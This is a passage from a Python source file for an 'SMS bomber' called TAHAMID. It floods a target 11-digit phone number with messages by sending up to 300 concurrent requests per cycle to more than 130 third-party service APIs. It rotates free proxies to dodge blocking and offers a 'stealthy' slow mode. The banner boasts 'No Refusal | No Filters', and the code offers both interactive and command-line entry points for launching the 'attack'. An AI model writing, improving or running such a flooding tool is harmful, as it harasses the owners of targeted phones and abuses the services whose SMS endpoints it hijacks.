    print(Fore.GREEN + f"APIs: {total_apis} (×{repeat} repeats) = {total_requests_per_cycle} requests/cycle")
    proxy_count = len([p for p in proxy_list if p is not None])
    print(Fore.GREEN + f"Proxies loaded: {proxy_count} | Timeout: {TIMEOUT}s")
    print(Fore.RED + Style.BRIGHT + "Press Ctrl+C to stop anytime.\n")
    
    success_total = 0
    fail_total = 0
    total_requests = 0
    
    async with aiohttp.ClientSession() as session:
        for cycle in range(1, cycles+1):
            tasks = []
            for api in APIS:
                for _ in range(repeat):
                    proxy = random.choice(proxy_list) if proxy_list else None
                    tasks.append(send_request(session, api, number, sem, proxy=proxy, retries=1, use_fallback=True))
            results = await asyncio.gather(*tasks)
            success = sum(results)
            fail = len(results) - success
            success_total += success
            fail_total += fail
            total_requests += len(results)
            
            print(Fore.MAGENTA + f"Cycle {cycle}/{cycles}: " + Fore.GREEN + f"Success {success}" + Fore.WHITE + f"/{len(results)} " + Fore.CYAN + f"(Rate: {success/len(results)*100:.1f}%)")
            if cycle < cycles and delay_between_cycles > 0:
                await asyncio.sleep(delay_between_cycles)
    
    return success_total, fail_total, total_requests

# ---------------- INTERACTIVE MODE ----------------
def run_interactive():
    clear_screen()
    print(Fore.RED + Style.BRIGHT + TAHAMID_BANNER)
    print(Fore.CYAN + Style.BRIGHT + "═" * 60)
    print(Fore.RED + Style.BRIGHT + "  💀 TAHAMID – Fast/Slow SMS Bomber (Auto Proxy + Fallback) 💀")
    print(Fore.WHITE + Style.BRIGHT +"  OWNER : TAHAMID")
    print(Fore.MAGENTA + Style.BRIGHT +"  Dev  : TAHAMID")
    print(Fore.GREEN + Style.BRIGHT + "  Status: Unlimited | No Refusal | No Filters")
    print(Fore.YELLOW + Style.BRIGHT +"  Mode  : Interactive (Fast / Slow)")
    print(Fore.BLUE + Style.BRIGHT +"  APIS  : 130+ WORKING APIS ")
    print(Fore.CYAN + Style.BRIGHT + "═" * 60)
    print()
    
    while True:
        number = input(Fore.RED + Style.BRIGHT +"Enter target number 🎯: +88 ").strip()
        if len(number) == 11 and number.isdigit():
            break
        print(Fore.RED + "Invalid number! Must be 11 digits.")
    
    print(Fore.YELLOW + "\nSelect bombing mode:")
    print("  " + Fore.GREEN + "1. Fast" + Fore.WHITE + "  (20 cycles, 300 conc, 0 delay – 5 sec per cycle) 💀")
    print("  " + Fore.GREEN + "2. Slow" + Fore.WHITE + "  (5 cycles, 20 conc, 2 sec delay – stealthy)")
    mode = input(Fore.CYAN + "Enter 1 or 2: ").strip()
    while mode not in ['1','2']:
        mode = input(Fore.RED + "Invalid. Enter 1 or 2: ").strip()
    
    if mode == '1':
        cycles, concurrency, delay, repeat = 20, 300, 0, 1
        print(Fore.RED + Style.BRIGHT + "🔥 Fast mode – High speed, no delay, 300 concurrent!")
    else:
        cycles, concurrency, delay, repeat = 5, 20, 2, 1
        print(Fore.GREEN + "Slow mode – Low speed, longer delay, 20 concurrent.")
    
    custom = input(Fore.CYAN + "Customize cycles? (y/n, default n): ").strip().lower()
    if custom == 'y':
        try:
            cycles = int(input(Fore.CYAN + "Enter cycles: ").strip())
            if cycles < 1: cycles = 1
        except: pass
    
    # Proxy selection
    print(Fore.YELLOW + "\nProxy option:")
    print("  1. Auto fetch and test proxies (recommended)")
    print("  2. No proxy (direct connection)")
    print("  3. Use manual proxies from proxies.txt")
    proxy_choice = input(Fore.CYAN + "Enter 1, 2 or 3 (default 1): ").strip() or '1'
    
    proxies = []
    if proxy_choice == '2':
        proxies = [None]
        print(Fore.YELLOW + "Direct connection mode (no proxy).")
    elif proxy_choice == '3':
        manual = load_manual_proxies(PROXY_FILE)
        if manual:
            proxies = manual
            print(Fore.GREEN + f"Loaded {len(proxies)} manual proxies.")
        else:
            print(Fore.RED + "No proxies.txt found. Falling back to auto.")
            proxies = asyncio.run(fetch_free_proxies())
    else:
        print(Fore.YELLOW + "Fetching and testing proxies...")
        proxies = asyncio.run(fetch_free_proxies())
        if not proxies:
            proxies = [None]
            print(Fore.RED + "No working proxies. Using direct connection.")
        else:
            print(Fore.GREEN + f"Using {len(proxies)} working proxies.")
    
    print(Fore.YELLOW + f"\nStarting attack on {number} with {cycles} cycles. Press Ctrl+C to stop.")
    print(Fore.CYAN + "SMS will flood the target within seconds! 💀")
    try:
        success, fail, total = asyncio.run(premium_bomber(number, cycles, concurrency, delay, proxies=proxies, repeat=repeat))
        print(Fore.GREEN + Style.BRIGHT + f"\n✅ Final Stats: Success: {success}, Failed: {fail}, Total: {total}")
        print(Fore.CYAN + f"Success Rate: {success/total*100:.2f}%")
    except KeyboardInterrupt:
        print(Fore.RED + Style.BRIGHT + "\n🛑 Attack stopped by user.")

# ---------------- CLI ENTRY ----------------
if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='TAHAMID Fast/Slow SMS Bomber with Auto Proxy + Fallback')
    parser.add_argument('-n', '--number', help='Target 11-digit number')
    parser.add_argument('-c', '--cycles', type=int, default=20, help='Cycles')
    parser.add_argument('-p', '--concurrency', type=int, default=300, help='Concurrency')
    parser.add_argument('--delay', type=float, default=0, help='Delay between cycles')
    parser.add_argument('--repeat', type=int, default=1, help='Repeats per API per cycle')
    parser.add_argument('--no-proxy', action='store_true', help='Disable proxy (direct)')
    parser.add_argument('--manual-proxy', action='store_true', help='Use proxies.txt')
    args = parser.parse_args()
    
    if args.number:
        number = args.number.strip()
        if len(number)!=11 or not number.isdigit():
            print(Fore.RED+"Invalid number")
            sys.exit(1)
        clear_screen()
        print(Fore.RED+Style.BRIGHT+TAHAMID_BANNER)
        print(Fore.YELLOW+f"Starting attack on {number}")
        
        if args.no_proxy:
            proxies = [None]
        elif args.manual_proxy:
            proxies = load_manual_proxies(PROXY_FILE)
            if not proxies:
                print(Fore.RED + "No proxies in proxies.txt. Using direct.")
                proxies = [None]
        else:
            print(Fore.YELLOW + "Fetching and testing proxies...")
            proxies = asyncio.run(fetch_free_proxies())
            if not proxies:
                print(Fore.RED + "No working proxies. Using direct.")
                proxies = [None]
        
        try:
            success, fail, total = asyncio.run(premium_bomber(number, args.cycles, args.concurrency, args.delay, proxies=proxies, repeat=args.repeat))
            print(Fore.GREEN+Style.BRIGHT+f"\n✅ Final Stats: Success: {success}, Failed: {fail}, Total: {total}")
            print(Fore.CYAN+f"Success Rate: {success/total*100:.2f}%")
        except KeyboardInterrupt:
            print(Fore.RED+Style.BRIGHT+"\n🛑 Stopped.")
    else:
        run_interactive()